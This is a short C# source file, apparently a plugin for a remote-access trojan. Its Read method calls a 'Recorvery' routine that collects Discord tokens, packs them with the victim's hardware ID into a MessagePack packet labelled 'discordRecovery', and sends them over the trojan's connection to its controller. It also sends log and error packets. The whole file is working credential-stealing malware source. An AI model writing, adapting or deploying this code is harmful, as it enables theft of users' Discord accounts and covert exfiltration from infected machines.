using System;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static void Read()
        {
            try
            {
                Recorvery.Recorver();
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "discordRecovery";
                msgpack.ForcePathObject("Tokens").AsString = Recorvery.totaltokens;
                Connection.Send(msgpack.Encode2Bytes());
                Log(Connection.Hwid + ":discord recovery success.");
            }
            catch (Exception ex)
            {
                Error(ex.Message);
                Connection.Disconnected();
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}